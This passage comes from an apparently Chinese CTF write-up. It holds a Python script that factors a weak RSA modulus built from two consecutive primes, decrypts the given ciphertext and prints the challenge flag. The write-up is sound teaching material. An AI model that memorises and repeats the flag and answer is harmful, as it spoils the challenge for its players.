173280870300519923715203696834882119083542571140839028806768298820015863852835794226059877700906545110752776137513745886446530644296244068573533415866288372258806488689702896105169105563661309394552655714439116657949182579256607803282002619932851022083044252527626831071719084726862098167058504014857808959509507079927043329860218143205867802447678657763092502703595859068700554763976014721402041206266622977798828412773984216149947581746621557407684424045536228695940316363053758694192430323960905458863919028226745439720770512594999441599361470532712341687933197440708229732759256063243580119155040005536274041077293091976606018500585881239869658926701105111190472713681295382152192237128324734905038277701951508078229426733519689307305874608135</span><br></code></pre></td></tr></table></figure><p>RSA，直接脚本秒了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">299487015341597647919776121004167231949688268241700414027108990830625623733773719845841268481813362766547912866733711608177564250583355016088619602664748425336481765034201744572985159895585715150798269166534598956939724628696559498880597219784298678035926538950792013309608367104567539694805267059251508650074879211671636277899101015682266724064486585722087645838229287808682200953448105025969146455228490015983463746790376132783796872114120190783210924155244559381221390948899033151290151152600368322574929968834669432260194965876835069287868333462555623127602208275637571642586991525702340484853548458548057993639750566860524849624229544573184492710462829280342457207433467447389201079678219686250530932773758629428257347183339748908201954402303</span><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">173280870300519923715203696834882119083542571140839028806768298820015863852835794226059877700906545110752776137513745886446530644296244068573533415866288372258806488689702896105169105563661309394552655714439116657949182579256607803282002619932851022083044252527626831071719084726862098167058504014857808959509507079927043329860218143205867802447678657763092502703595859068700554763976014721402041206266622977798828412773984216149947581746621557407684424045536228695940316363053758694192430323960905458863919028226745439720770512594999441599361470532712341687933197440708229732759256063243580119155040005536274041077293091976606018500585881239869658926701105111190472713681295382152192237128324734905038277701951508078229426733519689307305874608135</span><br><br>s = gmpy2.isqrt(n)<br>found = <span class="hljs-literal">False</span><br>p = <span class="hljs-literal">None</span><br>q = <span class="hljs-literal">None</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    current = s - i<br>    <span class="hljs-keyword">if</span> n % current == <span class="hljs-number">0</span>:<br>        p = current<br>        q = n // current<br>        <span class="hljs-keyword">if</span> gmpy2.is_prime(p) <span class="hljs-keyword">and</span> gmpy2.is_prime(q) <span class="hljs-keyword">and</span> gmpy2.next_prime(p) == q:<br>            found = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">if</span> found:<br>    phi = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>    d = gmpy2.invert(e, phi)<br>    m = <span class="hljs-built_in">pow</span>(c, d, n)<br>    flag = long_to_bytes(m)<br>    <span class="hljs-built_in">print</span>(flag.decode())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;未找到合适的因数。&quot;</span>)<br><br><span class="hljs-comment"># JNCTF&#123;Is_just_another_RSA&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>没把ezbase打出来可惜了，re也没做出来多少</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
